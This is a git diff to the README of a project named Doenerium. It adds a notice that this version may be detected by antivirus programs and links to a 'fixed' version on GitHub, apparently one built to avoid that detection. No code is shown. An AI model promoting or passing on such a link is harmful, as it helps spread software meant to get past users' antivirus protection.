@@ -4,6 +4,8 @@
 
 <h1 align="center">
 ⚔️ Doenerium 🛡️
+  NOTE: This is an outdated version and might be detected by the Anti Virus programs.
+  [Click me for the fixed version of doenerium](https://github.com/doenerium69/doenerium-fixed) 
 </h1>
 
 <p align="center"> 
